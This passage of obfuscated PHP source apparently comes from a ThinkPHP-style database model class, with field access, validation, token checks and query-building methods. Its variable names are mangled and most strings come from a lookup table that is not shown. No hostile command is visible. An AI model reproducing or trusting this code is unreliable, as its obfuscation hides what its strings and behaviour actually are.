$¢ïËù . $­ÀßØÚà; } return $this->setField($¢ïËù, array($äƒ‹Ãşª[292], $îÌïÏ‚)); } public function getField($Úš–ùØ›, $²ÜäŠ÷ú = null) { $òÛâ…÷— =& $_SERVER[Ãìšã«™]; $‰š«›ñ°[$òÛâ…÷—[268]] = $Úš–ùØ›; $‰š«›ñ° = $this->_parseOptions($‰š«›ñ°); $Úš–ùØ› = trim($Úš–ùØ›); if (strpos($Úš–ùØ›, $òÛâ…÷—[50])) { if (!isset($‰š«›ñ°[$òÛâ…÷—[287]])) { $‰š«›ñ°[$òÛâ…÷—[287]] = is_numeric($²ÜäŠ÷ú) ? $²ÜäŠ÷ú : $òÛâ…÷—[12]; } $Şåøè¼ = $this->db->select($‰š«›ñ°); if (!empty($Şåøè¼)) { $Ç…ÏôË = explode($òÛâ…÷—[50], $Úš–ùØ›); $Úš–ùØ› = array_keys($Şåøè¼[0]); $÷ĞÉÎ©µ = array_shift($Úš–ùØ›); $Ëùıä¬š = array_shift($Úš–ùØ›); $œÒëÜßà = array(); $åŞáÙö” = count($Ç…ÏôË); foreach ($Şåøè¼ as $×¢Ïª©•) { $Û¤ë¬Ö = $×¢Ïª©•[$÷ĞÉÎ©µ]; if (2 == $åŞáÙö”) { $œÒëÜßà[$Û¤ë¬Ö] = $×¢Ïª©•[$Ëùıä¬š]; } else { $œÒëÜßà[$Û¤ë¬Ö] = is_string($²ÜäŠ÷ú) ? implode($²ÜäŠ÷ú, $×¢Ïª©•) : $×¢Ïª©•; } } return $œÒëÜßà; } } else { if (!0 !== $²ÜäŠ÷ú) { $‰š«›ñ°[$òÛâ…÷—[287]] = is_numeric($²ÜäŠ÷ú) ? $²ÜäŠ÷ú : 1; } if ($²ÜäŠ÷ú === $òÛâ…÷—[250]) { unset($‰š«›ñ°[$òÛâ…÷—[287]]); } $×¢Ïª©• = $this->db->select($‰š«›ñ°); if (!empty($×¢Ïª©•)) { if ($²ÜäŠ÷ú === $òÛâ…÷—[250]) { return reset($×¢Ïª©•[0]); } if (!0 !== $²ÜäŠ÷ú && 1 == $‰š«›ñ°[$òÛâ…÷—[287]]) { return reset($×¢Ïª©•[0]); } foreach ($×¢Ïª©• as $¸¹û¼ç) { $‡ º®Ô©[] = $¸¹û¼ç[$Úš–ùØ›]; } return $‡ º®Ô©; } } return null; } public function create($şË‹»À = '', $Ø ÇÇ¨« = '') { $¼¡ú¥ğú =& $_SERVER[Ãìšã«™]; if (empty($şË‹»À)) { $şË‹»À = $_POST; } elseif (is_object($şË‹»À)) { $şË‹»À = get_object_vars($şË‹»À); } if (empty($şË‹»À) || !is_array($şË‹»À)) { $this->error = think_lang($¼¡ú¥ğú[266]); return !1; } $şË‹»À = $this->parseFieldsMap($şË‹»À, 0); $Ø ÇÇ¨« = $Ø ÇÇ¨« ? $Ø ÇÇ¨« : (!empty($şË‹»À[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¼¡ú¥ğú[268]])) { $ÉÔ¡±½Ò = $this->options[$¼¡ú¥ğú[268]]; unset($this->options[$¼¡ú¥ğú[268]]); } elseif ($Ø ÇÇ¨« == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÉÔ¡±½Ò = $this->insertFields; } elseif ($Ø ÇÇ¨« == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÉÔ¡±½Ò = $this->updateFields; } if (isset($ÉÔ¡±½Ò)) { if (is_string($ÉÔ¡±½Ò)) { $ÉÔ¡±½Ò = explode($¼¡ú¥ğú[50], $ÉÔ¡±½Ò); } if (think_config($¼¡ú¥ğú[293])) { $ÉÔ¡±½Ò[] = think_config($¼¡ú¥ğú[294]); } foreach ($şË‹»À as $ÚøîÅÏ => $À©») { if (!in_array($ÚøîÅÏ, $ÉÔ¡±½Ò)) { unset($şË‹»À[$ÚøîÅÏ]); } } } if (!$this->autoValidation($şË‹»À, $Ø ÇÇ¨«)) { return !1; } if (!$this->autoCheckToken($şË‹»À)) { $this->error = think_lang($¼¡ú¥ğú[295]); return !1; } if ($this->autoCheckFields) { $ÉÔ¡±½Ò = $this->getDbFields(); foreach ($şË‹»À as $ÚøîÅÏ => $À©») { if (!in_array($ÚøîÅÏ, $ÉÔ¡±½Ò)) { unset($şË‹»À[$ÚøîÅÏ]); } elseif (MAGIC_QUOTES_GPC && is_string($À©»)) { $şË‹»À[$ÚøîÅÏ] = stripslashes($À©»); } } } $this->autoOperation($şË‹»À, $Ø ÇÇ¨«); $this->data = $şË‹»À; return $şË‹»À; } public function autoCheckToken($òäè ­§) { $Š¬ ±²ñ =& $_SERVER[Ãìšã«™]; if (isset($this->options[$Š¬ ±²ñ[296]]) && !$this->options[$Š¬ ±²ñ[296]]) { return !0; } if (think_config($Š¬ ±²ñ[293])) { $œ©Œµø© = think_config($Š¬ ±²ñ[294]); if (!isset($òäè ­§[$œ©Œµø©]) || Session::get($œ©Œµø©)) { return !1; } list($«›õæ–, $Û¶ñ¿£) = explode($Š¬ ±²ñ[11], $òäè ­§[$œ©Œµø©]); if ($Û¶ñ¿£ && Session::get($œ©Œµø© . $Š¬ ±²ñ[10] . $«›õæ–) === $Û¶ñ¿£) { Session::remove($œ©Œµø© . $Š¬ ±²ñ[10] . $«›õæ–); return !0; } if (think_config($Š¬ ±²ñ[297])) { Session::remove($œ©Œµø© . $Š¬ ±²ñ[10] . $«›õæ–); } return !1; } return !0; } public function regex($Öéô”È“, $±„ê˜ãĞ) { $¶°“™å¶ =& $_SERVER[Ãìšã«™]; $µ×ÍÔÚË = array($¶°“™å¶[298] => $¶°“™å¶[299], $¶°“™å¶[300] => $¶°“™å¶[301], $¶°“™å¶[302] => $¶°“™å¶[303], $¶°“™å¶[304] => $¶°“™å¶[305], $¶°“™å¶[306] => $¶°“™å¶[307], $¶°“™å¶[308] => $¶°“™å¶[309], $¶°“™å¶[310] => $¶°“™å¶[311], $¶°“™å¶[285] => $¶°“™å¶[312], $¶°“™å¶[313] => $¶°“™å¶[314]); if (isset($µ×ÍÔÚË[strtolower($±„ê˜ãĞ)])) { $±„ê˜ãĞ = $µ×ÍÔÚË[strtolower($±„ê˜ãĞ)]; } return preg_match($±„ê˜ãĞ, $Öéô”È“) === 1; } private function autoOperation(&$º¯ø£¬ä, $µô›ºÙ) { $ªäÌç®É =& $_SERVER[Ãìšã«™]; if (!empty($this->options[$ªäÌç®É[315]])) { $ÛÛ‘—Ö† = $this->options[$ªäÌç®É[315]]; unset($this->options[$ªäÌç®É[315]]); } elseif (!empty($this->_auto)) { $ÛÛ‘—Ö† = $this->_auto; } if (isset($ÛÛ‘—Ö†)) { foreach ($ÛÛ‘—Ö† as $íèÁ¬ëë) { if (empty($íèÁ¬ëë[2])) { $íèÁ¬ëë[2] = THINK_MODEL_INSERT; } if ($µô›ºÙ == $íèÁ¬ëë[2] || $íèÁ¬ëë[2] == THINK_MODEL_BOTH) { switch (trim($íèÁ¬ëë[3])) { case $ªäÌç®É[316]: case $ªäÌç®É[317]: $öÉóÖ˜ı = isset($íèÁ¬ëë[4]) ? (array) $íèÁ¬ëë[4] : array(); if (isset($º¯ø£¬ä[$íèÁ¬ëë[0]])) { array_unshift($öÉóÖ˜ı, $º¯ø£¬ä[$íèÁ¬ëë[0]]); } if ($ªäÌç®É[316] == $íèÁ¬ëë[3]) { $º¯ø£¬ä[$íèÁ¬ëë[0]] = call_user_func_array($íèÁ¬ëë[1], $öÉóÖ˜ı); } else { $º¯ø£¬ä[$íèÁ¬ëë[0]] = call_user_func_array(array(&$this, $íèÁ¬ëë[1]), $öÉóÖ˜ı); } break; case $ªäÌç®É[268]: $º¯ø£¬ä[$íèÁ¬ëë[0]] = $º¯ø£¬ä[$íèÁ¬ëë[1]]; break; case $ªäÌç®É[318]: if ($ªäÌç®É[12] === $º¯ø£¬ä[$íèÁ¬ëë[0]]) { unset($º¯ø£¬ä[$íèÁ¬ëë[0]]); } break; case $ªäÌç®É[319]: default: $º¯ø£¬ä[$íèÁ¬ëë[0]] = $íèÁ¬ëë[1]; } if (!1 === $º¯ø£¬ä[$íèÁ¬ëë[0]]) { unset($º¯ø£¬ä[$íèÁ¬ëë[0]]); } } } } return $º¯ø£¬ä; } protected function autoValidation($ù¿£úÉ¥, $‡œ‘æÓÔ) { $¢Ø†»˜« =& $_SERVER[Ãìšã«™]; if (!empty($this->options[$¢Ø†»˜«[320]])) { $’Óˆ‹‡ = $this->options[$¢Ø†»˜«[320]]; unset($this->options[$¢Ø†»˜«[320]]); } elseif (!empty($this->_validate)) { $’Óˆ‹‡ = $this->_validate; } if (isset($’Óˆ‹‡)) { if ($this->patchValidate) { $this->error = array(); } foreach ($’Óˆ‹‡ as $ä˜½áÚ => $³¶“¬ı‰) { if (empty($³¶“¬ı‰[5]) || $³¶“¬ı‰[5] == THINK_MODEL_BOTH || $³¶“¬ı‰[5] == $‡œ‘æÓÔ) { if (0 == strpos($³¶“¬ı‰[2], $¢Ø†»˜«[321]) && strpos($³¶“¬ı‰[2], $¢Ø†»˜«[322])) { $³¶“¬ı‰[2] = think_lang(substr($³¶“¬ı‰[2], 2, -1)); } $³¶“¬ı‰[3] = isset($³¶“¬ı‰[3]) ? $³¶“¬ı‰[3] : THINK_EXISTS_VALIDATE; $³¶“¬ı‰[4] = isset($³¶“¬ı‰[4]) ? $³¶“¬ı‰[4] : $¢Ø†»˜«[323]; switch ($³¶“¬ı‰[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ù¿£úÉ¥, $³¶“¬ı‰)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¢Ø†»˜«[12] != trim($ù¿£úÉ¥[$³¶“¬ı‰[0]])) { if (!1 === $this->_validationField($ù¿£úÉ¥, $³¶“¬ı‰)) { return !1; } } break; default: if (isset($ù¿£úÉ¥[$³¶“¬ı‰[0]])) { if (!1 === $this->_validationField($ù¿£úÉ¥, $³¶“¬ı‰)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ŸúŠ‰Ö¤, $óæ±»³–) { if (!1 === $this->_validationFieldItem($ŸúŠ‰Ö¤, $óæ±»³–)) { if ($this->patchValidate) { $this->error[$óæ±»³–[0]] = $óæ±»³–[2]; } else { $this->error = $óæ±»³–[2]; return !1; } } return; } protected function _validationFieldItem($¦ÀäêèÕ, $Œ—éÖšß) { $É³ˆ‚Ñ¥ =& $_SERVER[Ãìšã«™]; switch (strtolower(trim($Œ—éÖšß[4]))) { case $É³ˆ‚Ñ¥[316]: case $É³ˆ‚Ñ¥[317]: $éª‹—ˆğ = isset($Œ—éÖšß[6]) ? (array) $Œ—éÖšß[6] : array(); if (is_string($Œ—éÖšß[0]) && strpos($Œ—éÖšß[0], $É³ˆ‚Ñ¥[50])) { $Œ—éÖšß[0] = explode($É³ˆ‚Ñ¥[50], $Œ—éÖšß[0]); } if (is_array($Œ—éÖšß[0])) { foreach ($Œ—éÖšß[0] as $õÏÉƒâ¹) { $¿Ëó°Å[$õÏÉƒâ¹] = $¦ÀäêèÕ[$õÏÉƒâ¹]; } array_unshift($éª‹—ˆğ, $¿Ëó°Å); } else { array_unshift($éª‹—ˆğ, $¦ÀäêèÕ[$Œ—éÖšß[0]]); } if ($É³ˆ‚Ñ¥[316] == $Œ—éÖšß[4]) { return call_user_func_array($Œ—éÖšß[1], $éª‹—ˆğ); } else { return call_user_func_array(array(&$this, $Œ—éÖšß[1]), $éª‹—ˆğ); } case $É³ˆ‚Ñ¥[324]: return $¦ÀäêèÕ[$Œ—éÖšß[0]] == $¦ÀäêèÕ[$Œ—éÖšß[1]]; case $É³ˆ‚Ñ¥[325]: if (is_string($Œ—éÖšß[0]) && strpos($Œ—éÖšß[0], $É³ˆ‚Ñ¥[50])) { $Œ—éÖšß[0] = explode($É³ˆ‚Ñ¥[50], $Œ—éÖšß[0]); } $ÜÂ€ê©« = array(); if (is_array($Œ—éÖšß[0])) { foreach ($Œ—éÖšß[0] as $õÏÉƒâ¹) { $ÜÂ€ê©«[$õÏÉƒâ¹] = $¦ÀäêèÕ[$õÏÉƒâ¹]; } } else { $ÜÂ€ê©«[$Œ—éÖšß[0]] = $¦ÀäêèÕ[$Œ—éÖšß[0]]; } if (!empty($¦ÀäêèÕ[$this->getPk()])) { $ÜÂ€ê©«[$this->getPk()] = array($É³ˆ‚Ñ¥[326], $¦ÀäêèÕ[$this->getPk()]); } if ($this->where($ÜÂ€ê©«)->find()) { return !1; } return !0; default: return $this->check($¦ÀäêèÕ[$Œ—éÖšß[0]], $Œ—éÖšß[1], $Œ—éÖšß[4]); } } public function check($ËÜâÕİ, $ÁéŸğıĞ, $ˆôìÜ¡® = "\162\x65\x67\145\x78") { $İ’íüİÇ =& $_SERVER[Ãìšã«™]; $ˆôìÜ¡® = strtolower(trim($ˆôìÜ¡®)); switch ($ˆôìÜ¡®) { case $İ’íüİÇ[7]: case $İ’íüİÇ[327]: $´§Éöá² = is_array($ÁéŸğıĞ) ? $ÁéŸğıĞ : explode($İ’íüİÇ[50], $ÁéŸğıĞ); return $ˆôìÜ¡® == $İ’íüİÇ[7] ? in_array($ËÜâÕİ, $´§Éöá²) : !in_array($ËÜâÕİ, $´§Éöá²); case $İ’íüİÇ[328]: case $İ’íüİÇ[329]: if (is_array($ÁéŸğıĞ)) { $²ã‰¤Åù = $ÁéŸğıĞ[0]; $¬±ëµÁ = $ÁéŸğıĞ[1]; } else { list($²ã‰¤Åù, $¬±ëµÁ) = explode($İ’íüİÇ[50], $ÁéŸğıĞ); } return $ˆôìÜ¡® == $İ’íüİÇ[328] ? $ËÜâÕİ >= $²ã‰¤Åù && $ËÜâÕİ <= $¬±ëµÁ : $ËÜâÕİ < $²ã‰¤Åù || $ËÜâÕİ > $¬±ëµÁ; case $İ’íüİÇ[330]: case $İ’íüİÇ[331]: return $ˆôìÜ¡® == $İ’íüİÇ[330] ? $ËÜâÕİ == $ÁéŸğıĞ : $ËÜâÕİ != $ÁéŸğıĞ; case $İ’íüİÇ[332]: $Ü×´ĞÒë = mb_strlen($ËÜâÕİ, $İ’íüİÇ[333]); if (strpos($ÁéŸğıĞ, $İ’íüİÇ[50])) { list($²ã‰¤Åù, $¬±ëµÁ) = explode($İ’íüİÇ[50], $ÁéŸğıĞ); return $Ü×´ĞÒë >= $²ã‰¤Åù && $Ü×´ĞÒë <= $¬±ëµÁ; } else { return $Ü×´ĞÒë == $ÁéŸğıĞ; } case $İ’íüİÇ[334]: list($¿×ŸÑÒ, $ğØ»š÷Ç) = explode($İ’íüİÇ[50], $ÁéŸğıĞ); if (!is_numeric($¿×ŸÑÒ)) { $¿×ŸÑÒ = strtotime($¿×ŸÑÒ); } if (!is_numeric($ğØ»š÷Ç)) { $ğØ»š÷Ç = strtotime($ğØ»š÷Ç); } return NOW_TIME >= $¿×ŸÑÒ && NOW_TIME <= $ğØ»š÷Ç; case $İ’íüİÇ[335]: return in_array(get_client_ip(), explode($İ’íüİÇ[50], $ÁéŸğıĞ)); case $İ’íüİÇ[336]: return !in_array(get_client_ip(), explode($İ’íüİÇ[50], $ÁéŸğıĞ)); case $İ’íüİÇ[323]: default: return $this->regex($ËÜâÕİ, $ÁéŸğıĞ); } } public function query($ôÔ¢±ç“, $¨Ğú‡ = false) { $®æ”¶›ù =& $_SERVER[Ãìšã«™]; if (!is_bool($¨Ğú‡) && !is_array($¨Ğú‡)) { $¨Ğú‡ = func_get_args(); array_shift($¨Ğú‡); } $ôÔ¢±ç“ = str_replace(array($®æ”¶›ù[226], $®æ”¶›ù[337]), $®æ”¶›ù[53], $ôÔ¢±ç“); $ôÔ¢±ç“ = $this->parseSql($ôÔ¢±ç“, $¨Ğú‡); return $this->db->query($ôÔ¢±ç“); } public function execute($ÊœÌ¼“, $Ûèæ¥àû = false) { if (!is_bool($Ûèæ¥àû) && !is_array($Ûèæ¥àû)) { $Ûèæ¥àû = func_get_args(); array_shift($Ûèæ¥àû); } $ÊœÌ¼“ = $this->parseSql($ÊœÌ¼“, $Ûèæ¥àû); return $this->db->execute($ÊœÌ¼“); } protected function parseSql($ÍäÜÖâ, $Á¥Ù¢§ğ) { $Ê‚‚ÆÑ =& $_SERVER[Ãìšã«™]; if (!0 === $Á¥Ù¢§ğ) { $¾°Âí¡ò = $this->_parseOptions(); $ÍäÜÖâ = $this->db->parseSql($ÍäÜÖâ, $¾°Âí¡ò); } elseif (is_array($Á¥Ù¢§ğ)) { $Á¥Ù¢§ğ = array_map(array($this->db, $Ê‚‚ÆÑ[338]), $Á¥Ù¢§ğ); $ÍäÜÖâ = vsprintf($ÍäÜÖâ, $Á¥Ù¢§ğ); } else { $ÍäÜÖâ = strtr($ÍäÜÖâ, array($Ê‚‚ÆÑ[339] => $this->getTableName(), $Ê‚‚ÆÑ[340] => think_config($Ê‚‚ÆÑ[239]))); } $this->db->setModel($this->name); return $ÍäÜÖâ; } public function db($¨²ïÓ¸• = '', $¬¨°¸ï‰ = '', $öãá“— = array()) { $ºı«Á§½ =& $_SERVER[Ãìšã«™]; if ($ºı«Á§½[12] === $¨²ïÓ¸• && $this->db) { return $this->db; } static $£ºİÃ¯¾ = array(); static $Û¬ı«¨ = array(); if (!isset($Û¬ı«¨[$¨²ïÓ¸•]) || isset($Û¬ı«¨[$¨²ïÓ¸•]) && $¬¨°¸ï‰ && $£ºİÃ¯¾[$¨²ïÓ¸•] != $¬¨°¸ï‰) { if (!empty($¬¨°¸ï‰) && is_string($¬¨°¸ï‰) && !1 === strpos($¬¨°¸ï‰, $ºı«Á§½[8])) { $¬¨°¸ï‰ = think_config($¬¨°¸ï‰); } $¨²ïÓ¸• = think_guid($¬¨°¸ï‰); $Û¬ı«¨[$¨²ïÓ¸•] = Db::getInstance($¬¨°¸ï‰); } elseif (NULL === $¬¨°¸ï‰) { $Û¬ı«¨[$¨²ïÓ¸•]->close(); unset($Û¬ı«¨[$¨²ïÓ¸•]); return; } if (!empty($öãá“—)) { if (is_string($öãá“—)) { parse_str($öãá“—, $öãá“—); } foreach ($öãá“— as $†À²ß–® => $½û¥İéù) { $this->setProperty($†À²ß–®, $½û¥İéù); } } $£ºİÃ¯¾[$¨²ïÓ¸•] = $¬¨°¸ï‰; $this->db = $Û¬ı«¨[$¨²ïÓ¸•]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ËÈ Ğ’ = get_class($this); if ($ËÈ Ğ’ == $_SERVER[Ãìšã«™][341]) { return $this->name; } $this->name = substr($ËÈ Ğ’, 0, -5); } return $this->name; } public function getTableName() { $ŠË•Á…— =& $_SERVER[Ãìšã«™]; if (empty($this->trueTableName)) { $åç†ùã£ = !empty($this->tablePrefix) ? $this->tablePrefix : $ŠË•Á…—[12]; if (!empty($this->tableName)) { $åç†ùã£ .= $this->tableName; } else { $åç†ùã£ .= think_parse_name($this->name); } $this->trueTableName = strtolower($åç†ùã£); } return (!empty($this->dbName) ? $this->dbName . $ŠË•Á…—[10] : $ŠË•Á…—[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $û¥…ñÁ =& $_SERVER[Ãìšã«™]; return isset($this->fields[$û¥…ñÁ[246]]) ? $this->fields[$û¥…ñÁ[246]] : $this->pk; } public function getDbFields() { $¾•Ş¦Ş§ =& $_SERVER[Ãìšã«™]; if (isset($this->options[$¾•Ş¦Ş§[274]])) { $Õ÷„ê‹ = $this->db->getFields($this->options[$¾•Ş¦Ş§[274]]); return $Õ÷„ê‹ ? array_keys($Õ÷„ê‹) : !1; } if ($this->fields) { $Õ÷„ê‹ = $this->fields; unset($Õ÷„ê‹[$¾•Ş¦Ş§[245]], $Õ÷„ê‹[$¾•Ş¦Ş§[246]], $Õ÷„ê‹[$¾•Ş¦Ş§[247]], $Õ÷„ê‹[$¾•Ş¦Ş§[244]]); return $Õ÷„ê‹; } return !1; } public function data($´ïí = '') { $ø›·›©º =& $_SERVER[Ãìšã«™]; if ($ø›·›©º[12] === $´ïí && !empty($this->data)) { return $this->data; } if (is_object($´ïí)) { $´ïí = get_object_vars($´ïí); } elseif (is_string($´ïí)) { parse_str($´ïí, $´ïí); } elseif (!is_array($´ïí)) { think_exception(think_lang($ø›·›©º[266])); } $this->data = $´ïí; return $this; } public function join($ÙÄ¨Äá) { $µôõÇÄİ =& $_SERVER[Ãìšã«™]; if (is_array($ÙÄ¨Äá)) { $this->options[$µôõÇÄİ[277]] = $ÙÄ¨Äá; } elseif (!empty($ÙÄ¨Äá)) { $this->options[$µôõÇÄİ[277]][] = $ÙÄ¨Äá; } return $this; } public function union($ËÌ’áÜ, $êêçù³¶ = false) { $²°ğÒ–¯ =& $_SERVER[Ãìšã«™]; if (empty($ËÌ’áÜ)) { return $this; } if ($êêçù³¶) { $this->options[$²°ğÒ–¯[342]][$²°ğÒ–¯[343]] = !0; } if (is_object($ËÌ’áÜ)) { $ËÌ’áÜ = get_object_vars($ËÌ’áÜ); } if (is_string($ËÌ’áÜ)) { $üòá™º• = $ËÌ’áÜ; } elseif (is_array($ËÌ’áÜ)) { if (isset($ËÌ’áÜ[0])) { $this->options[$²°ğÒ–¯[342]] = array_merge($this->options[$²°ğÒ–¯[342]], $ËÌ’áÜ); return $this; } else { $üòá™º• = $ËÌ’áÜ; } } else { think_exception(think_lang($²°ğÒ–¯[266])); } $this->options[$²°ğÒ–¯[342]][] = $üòá™º•; return $this; } public function cache($ÂùÂÓœ = true, $Á®ù¨´® = null, $©À»ú’å = '') { $ÙÂ±ã « =& $_SERVER[Ãìšã«™]; if (!1 !== $ÂùÂÓœ) { $this->options[$ÙÂ±ã «[344]] = array($ÙÂ±ã «[95] => $ÂùÂÓœ, $ÙÂ±ã «[334] => $Á®ù¨´®, $ÙÂ±ã «[33] => $©À»ú’å); } return $this; } public function field($Ë§éíïº, $ÕÏ –•­ = false) { $Œ¼¸ò¯Ù =& $_SERVER[Ãìšã«™]; if (!0 === $Ë§éíïº) { $µ“Œ÷ÅÓ = $this->getDbFields(); $Ë§éíïº = $µ“Œ÷ÅÓ ? $µ“Œ÷ÅÓ : $Œ¼¸ò¯Ù[181]; } elseif ($ÕÏ –•­) { if (is_string($Ë§éíïº)) { $Ë§éíïº = explode($Œ¼¸ò¯Ù[50], $Ë§éíïº); } $µ“Œ÷ÅÓ = $this->getDbFields(); $Ë§éíïº = $µ“Œ÷ÅÓ ? array_diff($µ“Œ÷ÅÓ, $Ë§éíïº) : $Ë§éíïº; } $this->options[$Œ¼¸ò¯Ù[268]] = $Ë§éíïº; return $this; } public function scope($Şù³æıŠ = '', $ÉÊ“ÈóÄ = NULL) { $ë§Â™Ï =& $_SERVER[Ãìšã«™]; if ($ë§Â™Ï[12] === $Şù³æıŠ) { if (isset($this->_scope[$ë§Â™Ï[37]])) { $ò™§ãŠ = $this->_scope[$ë§Â™Ï[37]]; } else { return $this; } } elseif (is_string($Şù³æıŠ)) { $Ç†ƒåÅÎ = explode($ë§Â™Ï[50], $Şù³æıŠ); $ò™§ãŠ = array(); foreach ($Ç†ƒåÅÎ as $Ÿó¼É®) { if (!isset($this->_scope[$Ÿó¼É®])) { continue; } $ò™§ãŠ = array_merge($ò™§ãŠ, $this->_scope[$Ÿó¼É®]); } if (!empty($ÉÊ“ÈóÄ) && is_array($ÉÊ“ÈóÄ)) { $ò™§ãŠ = array_merge($ò™§ãŠ, $ÉÊ“ÈóÄ); } } elseif (is_array($Şù³æıŠ)) { $ò™§ãŠ = $Şù³æıŠ; } if (is_array($ò™§ãŠ) && !empty($ò™§ãŠ)) { $this->options = array_merge($this->options, array_change_key_case($ò™§ãŠ)); } return $this; } public function where($ï§¹à¶°, $¨¿àÉ¼ì = null) { $ÃØˆ …Ş =& $_SERVER[Ãìšã«™]; if (!is_null($¨¿àÉ¼ì) && is_string($ï§¹à¶°)) { if (!is_array($¨¿àÉ¼ì)) { $¨¿àÉ¼ì = func_get_args(); array_shift($¨¿àÉ¼ì); } $¨¿àÉ¼ì = array_map(array($this->db, $ÃØˆ …Ş[338]), $¨¿àÉ¼ì); $ï§¹à¶° = vsprintf($ï§¹à¶°, $¨¿àÉ¼ì); } elseif (is_object($ï§¹à¶°)) { $ï§¹à¶° = get_object_vars($ï§¹à¶°); } elseif (is_array($ï§¹à¶°)) { foreach ($ï§¹à¶° as $¨ÑôÅ© => $™§²õšÕ) { if ((is_numeric($¨ÑôÅ©) || !$¨ÑôÅ©) && is_string($™§²õšÕ)) { if (strpos($™§²õšÕ, $ÃØˆ …Ş[345]) === 0) { continue; } think_trace($ÃØˆ …Ş[346], $ÃØˆ …Ş[12], $ÃØˆ …Ş[49]); die; } } } if (is_string($ï§¹à¶°) && $ÃØˆ …Ş[12] != $ï§¹à¶°) { $¥›¬ñÉï = array(); $¥›¬ñÉï[$ÃØˆ …Ş[347]] = $ï§¹à¶°; $ï§¹à¶° = $¥›¬ñÉï; } if (isset($this->options[$ÃØˆ …Ş[270]])) { $this->options[$ÃØˆ …Ş[270]] = array_merge($this->options[$ÃØˆ …Ş[270]], $ï§¹à¶°); } else { $this->options[$ÃØˆ …Ş[270]] = $ï§¹à¶°; } return $this; } public function limit($¤¥ûØÉï, $ö‘´¢œ€ = null) { $úµ«©•Ç =& $_SERVER[Ãìšã«™]; $this->options[$úµ«©•Ç[287]] = is_null($ö‘´¢œ€) ? $¤¥ûØÉï : $¤¥ûØÉï . $úµ«©•Ç[50] . $ö‘´¢œ€; return $this; } public function page($™µÑ­³•, $¦…ÌÀ¯ = null) { $Åàøí¸Û =& $_SERVER[Ãìšã«™]; $this->options[$Åàøí¸Û[348]] = is_null($¦…ÌÀ¯) ? $™µÑ­³• : $™µÑ­³• . $Åàøí¸Û[50] . $¦…ÌÀ¯; return $this; } public function comment($¾áò÷„¹) { $this->options[$_SERVER[Ãìšã«™][349]] = $¾áò÷„¹; return $this; } public function setProperty($ùî®ÎÄç, $ÁÇÛ¨«¬) { if (property_exists($this, $ùî®ÎÄç)) { $this->{$ùî®ÎÄç} = $ÁÇÛ¨«¬; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\x69\155\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\x74\54\165\160\144\141\164\145", "\x66\x75\x6e\143\x74\151\x6f\x6e"), array("\x63\x72\x65\141\x74\x65\124\x69\x6d\x65", "\x74\151\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\x69\157\x6e")); public function setDataAuto($‚®¨ºıÚ) { $this->dataAuto = $‚®¨ºıÚ; } public function __construct($ã–üÄö¤ = '', $ŞÃî´³ = '', $–Æğ¾„ˆ = '') { parent::__construct($ã–üÄö¤, $ŞÃî´³, $–Æğ¾„ˆ); } protected $tableMeta = array(); protected function _beforeInsert(&$ñ‘ÅÔ , $Ş¾…¤Å…) { $ÕÑØºÆ =& $_SERVER[Ãìšã«™]; if (!$this->checkDataAutoHas($ÕÑØºÆ[350])) { return; } $this->dataBeforeFilter($ñ‘ÅÔ , $ÕÑØºÆ[350]); } protected function _beforeUpdate(&$¨ä•İ†, $áÓàÑÆç) { $öışÈË =& $_SERVER[Ãìšã«™]; if (!$this->checkDataAutoHas($öışÈË[351])) { return; } $this->dataBeforeFilter($¨ä•İ†, $öışÈË[351]); } protected function _afterSelect(&$ıÛ‹ŞŞı, $ò¡‘ªÏô) { if (!is_array($ıÛ‹ŞŞı)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ãìšã«™][352])) { return; } foreach ($ıÛ‹ŞŞı as &$œİ¼¯‹¨) { $this->dataAfterFilter($œİ¼¯‹¨); } unset($œİ¼¯‹¨); } protected function _afterFind(&$—œ½µõ¾, $ŠÊÂ÷ó) { if (!is_array($—œ½µõ¾)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ãìšã«™][352])) { return; } $this->dataAfterFilter($—œ½µõ¾); } public static function textEncode($Üü«…µ™) { if (!$Üü«…µ™) { return $Üü«…µ™; } $€ÜÖÃ­¬ = json_encode($Üü«…µ™); $€ÜÖÃ­¬ = preg_replace_callback($_SERVER[Ãìšã«™][353], function ($Òç÷É¢Š) { return addslashes($Òç÷É¢Š[0]); }, $€ÜÖÃ­¬); return json_decode($€ÜÖÃ­¬); } public static function textDecode($§ûë÷Âä) { $ÅçÏşÌ¡ =& $_SERVER[Ãìšã«™]; $Úàµ×¢Î = json_encode($§ûë÷Âä); $Úàµ×¢Î = preg_replace_callback($ÅçÏşÌ¡[354], function ($ö‘¢ßœ³) { return $_SERVER[Ãìšã«™][98]; }, $Úàµ×¢Î); return json_decode($Úàµ×¢Î); } public function setAutoIncrement($Îû­°ĞË) { $¸Å÷Â½‘ = array($this->getPk() => $Îû­°ĞË); $ª¯‘¡ıÒ = $this->data($¸Å÷Â½‘)->add(); if ($ª¯‘¡ıÒ) { $this->delete($ª¯‘¡ıÒ); } } public function getAutoIncrement() { $ÅÈÛÙš§ = $this->getTableName(); $òÅ£‹‚ = $this->max($this->getPk()); $³Ê™ñ“ = $this->query("\163\x68\x6f\167\x20\164\x61\142\154\145\40\163\164\x61\164\165\163\40\x77\x68\x65\162\x65\x20\116\141\155\145\75\x27{$ÅÈÛÙš§}\47"); $÷åĞ‡»© = $³Ê™ñ“[0][$_SERVER[Ãìšã«™][355]]; $‘ç˜…öó = max($òÅ£‹‚, $÷åĞ‡»©); return 